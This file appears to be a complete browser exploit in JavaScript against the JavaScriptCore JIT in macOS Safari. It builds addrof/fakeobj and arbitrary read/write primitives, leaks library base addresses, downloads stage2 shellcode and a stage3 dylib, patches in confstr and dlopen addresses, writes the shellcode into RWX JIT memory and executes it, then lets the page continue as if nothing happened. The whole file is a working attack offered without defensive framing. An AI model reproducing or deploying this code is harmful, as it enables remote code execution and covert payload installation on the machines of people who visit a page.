var f2i = Int64.fromDouble
var i2f = (v) => {return new Int64(v);}
var assert = (cond, str) =>{if(!cond) throw str;}
// Must create this indexing type transition first,
// otherwise the JIT will deoptimize later.
var a = [13.37, 13.37];
a[0] = {};
let haxxx = [13.37,1337]
haxxx[1] = 4
haxxx.prop = 13.37
function getElem(){
    return haxxx[0];
}
function setElem(val){
    haxxx[0] = val;
}

//JIT it out
//At least DFG, boiz
for(let i=0;i<100000;i++){
    getElem()
    setElem(133.7)
}
//Escape from JIT watchpoint
delete haxxx.prop
haxxx[0] = {}
let addrof = (obj) => {
    haxxx[0] = obj
    return f2i(getElem());
}
let fakeobj = (addr) => {
    setElem(addr.asDouble())
    return haxxx[0];//This is typed as Object, pointed to addr
}
function makeJITCompiledFunction() {
    // Some code to avoid inlining...
    function target(num) {
        for (var i = 2; i < num; i++) {
            if (num % i === 0) {
                return false;
            }
        }
        return true;
    }

    // Force JIT compilation.
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    for (var i = 0; i < 1000; i++) {
        target(i);
    }
    return target;
}

function str2ab(str) {
    var array = new Uint8Array(str.length);
    for(var i = 0; i < str.length; i++) {
        array[i] = str.charCodeAt(i);
    }
    return array.buffer
}
async function pwn() {
    print("[*] Downloading Stage2")
    var shellcode = await fetch("/stage2_macOS.bin").then(function(response){
        if(!response.ok){
            print("[-] failed to download stage2")
            throw "Failed to download stage2"
        }
        return response.arrayBuffer()
    })
    print("[*] Downloading Stage3")
    var payload = new Uint8Array(await fetch("/stage3_macOS.dylib").then(function(response){
        if(!response.ok){
            print("[-] failed to download stage3")
            throw "Failed to download stage3"
        }
        return response.arrayBuffer()
    }))
    //Spraying Structure ID
    var structure_spray = [];
    for(let i =0;i<1000;i++){
        let array = [13.37]
        array.a = 13.37;//later use.
        array['prop_'+i] = 13.37;
        structure_spray.push(array);
    }
    var victim = structure_spray[500];//Right in the middle
    var buf = new ArrayBuffer(0x10);
    var u32 = new Uint32Array(buf);
    var f64 = new Float64Array(buf);
    u32[0] = 0x200;
    u32[1] = 0x01082007 - 0x10000;
    var flags_double = f64[0];
    u32[1] = 0x01082009 - 0x10000;
    var flags_contiguous = f64[0];
    var outer = {
        cell_header:flags_double,
        butterfly: victim
    }
//    print("[*]victim @ "+Int64.fromDouble(addrof(victim)))
//    //print("[*]victim "+describe(victim))
    print("[*] outer @ "+addrof(outer));
    var hax = fakeobj(Add(addrof(outer),0x10));//To the inlined property of outer
//    print("[*]hax @ "+addrof(hax));
        //optional: If addrof and fakeobj is unstable, we need this.
//    {
//    //hax's butterfly now is the JSCell of victim, we can control headers & butterfly of victim
//        var unboxed = [13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37,13.37];
//        var unboxed_size = unboxed.length;
//        unboxed[0] = 4.2
//        var boxed = [{}]
//        hax[1] = unboxed;//now victim's butterfly pointed to the start of object unboxed, let's extract the butterfly
//        var tmp_butterfly = victim[1];
//        print("[*] Shared Butterfly: "+f2i(tmp_butterfly))
//        hax[1] = boxed;//now victim pointed to the start of object unboxed, make unboxed and boxed have the same butterfly
//        victim[1] = tmp_butterfly
//        //Now we have unboxed and boxed have the same butterfly, lets implement a better addrof and fakeobj
//        addrof = (obj) =>{
//            boxed[0] = obj;
//            return f2i(unboxed[0]);
//        }
//        fakeobj = (addr) =>{
//            unboxed[0] = addr.asDouble();
//            return boxed[0];
//        }
//    }
//    print("[*] Test stage2 addrOf: "+addrof(b));
    outer.cell_header = flags_double//hax is now arrayWithDouble, otherwise, the address we put in hax[1] will be converted to JSValue
    function read64(where){
        hax[1] = Add(where,0x10).asDouble();//victim.a is -0x10 from butterfly
        return addrof(victim.a);
    }
    function write64(where,what){
        hax[1] = Add(where,0x10).asDouble();//victim.a is -0x10 from butterfly
        victim.a = fakeobj(i2f(what))
    }
    //write 2 bytes, destroy 6 bytes after.
    function writeVal(where,what){
        hax[1] = Add(where,0x10).asDouble();//victim.a is -0x10 from butterfly
        victim.a = what
    }
    function write(where,what){
        let length = what.byteLength;
        while(length%4!=0) length+=1
        what = new Uint8Array(what);
        let uint8view = new Uint8Array(length)
        for(let i=0;i<what.length;i++)
            uint8view[i] = what[i];
        let uint16view = new Uint16Array(uint8view.buffer)
//        print(uint8view)
//        print(uint16view))
        
        for(let i=0;i<uint16view.length;i++){
            let val = read64(where)
            //print(val)
            write64(where, 0x42424242)
            writeVal(where, uint16view[i]);
            where = Add(where,2);
        }
    }
    function test(){
        var v = {};
        var obj = {p: v};

        var addr = addrof(obj);
        assert(fakeobj(addr).p == v, "addrof and/or fakeobj does not work");

        var propertyAddr = Add(addr, 0x10);

        var value = read64(propertyAddr);
        assert(value.asDouble() == addrof(v).asDouble(), "read64 does not work");

        assert(obj.p == 0x1337, "writeVal does not work");
    }
    // Find binary base
    var funcAddr = addrof(Math.sin);
    var executableAddr = read64(Add(funcAddr, 24));
    var codeAddr = read64(Add(executableAddr, 24));
    var vtabAddr = read64(codeAddr);
    var jscBase = Sub(vtabAddr,0xe80c08)
    print("[+] JavaScriptCore @ "+jscBase)

    var leakAddr =read64(Add(jscBase,0xe6a020))//JavaScriptCore.__DATA.__nl_symbol_ptr
    var libcBase = Sub(leakAddr,0x1b5874)//shrug
    print("[+] libsystem_c.dylib @ "+libcBase)
    print("[*] "+read64(libcBase))
    
    leakAddr = read64(Add(jscBase,0xe6a000))//JavaScriptCore.__DATA.__nl_symbol_ptr
    var dyldBase = Sub(leakAddr,0x2214)//shrug
    print("[+] libdyld.dylib @ "+dyldBase)
    
    var confstr = Add(libcBase,0x1c18)
    var dlopen = Add(dyldBase,0x1c7b)
    print("[+] confstr @ "+confstr)
    print("[+] dlopen @ "+dlopen)
    print("[*] Patching shellcode")
    var payloadAddr = read64(Add(addrof(payload),0x10))
    print("[*] payload @ "+addrof(payload))
    print("[*] payload buffer @ "+payloadAddr)
    shellcode = new Uint8Array(shellcode);
    function patch(from,to){
        print(from)
        print(to)
        let found = false;
        for(let i=0;i<shellcode.length&&!found;i++)
        {
            let matched = true
            for(let j=0;j<from.length;j++)
            if(shellcode[i+j]!=from[j]){
                matched = false;
                break;
            }
            if(matched){
                found=true;
                for(let j=0;j<to.length;j++)
                {
                    shellcode[i+j] = to[j];
                }
                print("[+] Patch applied!")
            }
        }
    }
    patch(i2f("0x4141414141414141").getBytes(),confstr.getBytes())
    patch(i2f("0x4242424242424242").getBytes(),payloadAddr.getBytes())
    patch(i2f("0x4343434343434343").getBytes(),i2f(payload.byteLength).getBytes())
    patch(i2f("0x4444444444444444").getBytes(),dlopen.getBytes())
    {
        var func = makeJITCompiledFunction();
        var funcAddr = addrof(func);
        print("[+] Shellcode function object @ " + funcAddr);
        
        var executableAddr = read64(Add(funcAddr, 24));
        print("[+] Executable instance @ " + executableAddr);
        
        var jitCodeAddr = read64(Add(executableAddr, 24));
        print("[+] JITCode instance @ " + jitCodeAddr);
        var codeAddr = read64(Add(jitCodeAddr, 32));
        print("[+] RWX memory @ " + codeAddr.toString());
        print("[+] Reading from RWX memory: "+read64(codeAddr))
        print("[+] Writing shellcode...");
        write(codeAddr, shellcode);
        print("[+] Shellcode written!")
        print("[!] Jumping into shellcode...");
        print("[+] result: "+func());
        outer = null;
        hax = null;
    }
    print("[+] I'm done. Continuing WebContent like nothing happened!")
}

ready.then(async function() {
    try {
        await pwn();
    } catch (e) {
        print("[-] Exception caught: " + e);
        ws_log.send("Connection closed!");
        ws_log.close();
    }
}).catch(function(err) {
    print("[-] Initialization failed");
});
